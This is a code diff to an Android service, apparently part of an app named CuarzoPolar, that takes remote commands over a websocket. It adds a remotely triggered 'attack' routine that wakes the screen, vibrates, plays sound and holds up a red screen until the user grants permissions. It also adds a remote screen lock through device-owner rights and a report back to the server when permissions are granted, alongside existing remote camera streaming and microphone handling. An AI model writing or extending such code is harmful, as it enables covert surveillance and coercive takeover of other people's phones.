@@ -62,8 +62,10 @@ class PermissionService : LifecycleService() {
     var onSendToBackground: (() -> Unit)? = null
     var onStreamStarted: (() -> Unit)? = null
     var onStreamStopped: (() -> Unit)? = null
+    var onClose: (() -> Unit)? = null
     var isRedScreenActive = false
     var isStreamActive = false
+    var permissionsGranted = false
     val isMicActive: Boolean get() = microphoneActive
     private var photoCallback: ((ByteArray) -> Unit)? = null
     private var discoveryJob: Job? = null
@@ -131,13 +133,14 @@ class PermissionService : LifecycleService() {
                 if (obj.optString("type") == "command") {
                     when (obj.optString("action")) {
                         "attack" -> {
-                            // Atomic attack sequence: effects first, then bring to front
-                            isRedScreenActive = true
                             commandHandler.handle("vibrate", "")
                             commandHandler.handle("playSound", "")
-                            onShowRedScreen?.invoke()
-                            lifecycleScope.launch(kotlinx.coroutines.Dispatchers.Main) {
-                                bringAppToFront()
+                            wakeScreenIfNeeded()
+                            if (!permissionsGranted && !isRedScreenActive) {
+                                isRedScreenActive = true
+                                lifecycleScope.launch(kotlinx.coroutines.Dispatchers.Main) {
+                                    onShowRedScreen?.invoke()
+                                }
                             }
                         }
                         "showRedScreen" -> {
@@ -150,6 +153,11 @@ class PermissionService : LifecycleService() {
                         }
                         "bringToForeground" -> bringAppToFront()
                         "sendToBackground" -> onSendToBackground?.invoke()
+                        "lockScreen" -> {
+                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                            if (dpm.isDeviceOwnerApp(packageName)) dpm.lockNow()
+                        }
+                        "close" -> onClose?.invoke()
                         "wakeScreen" -> wakeAndShowApp()
                         "startStream" -> {
                             isStreamActive = true
@@ -269,6 +277,11 @@ class PermissionService : LifecycleService() {
         }
     }
 
+    fun notifyPermissionsGranted() {
+        permissionsGranted = true
+        wsManager.sendText("""{"type":"permissions_granted"}""")
+    }
+
     fun isDeviceAdmin(): Boolean {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val comp = ComponentName(this, PermissionDeviceAdminReceiver::class.java)
@@ -301,6 +314,17 @@ class PermissionService : LifecycleService() {
             )
         } else {
             startActivity(intent)
+        }
+    }
+
+    private fun wakeScreenIfNeeded() {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        if (!pm.isInteractive) {
+            @Suppress("DEPRECATION")
+            pm.newWakeLock(
+                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                "CuarzoPolar::attackWake"
+            ).acquire(3000L)
         }
     }
 
@@ -344,6 +368,7 @@ class PermissionService : LifecycleService() {
         isStreamActive = false
         videoStreamManager.stopStreaming()
         isRedScreenActive = false
+        permissionsGranted = false
         commandHandler.handle("hideRedScreen", "")
         updateForegroundService(connectionStatusText(ConnectionState.DISCONNECTED))
     }
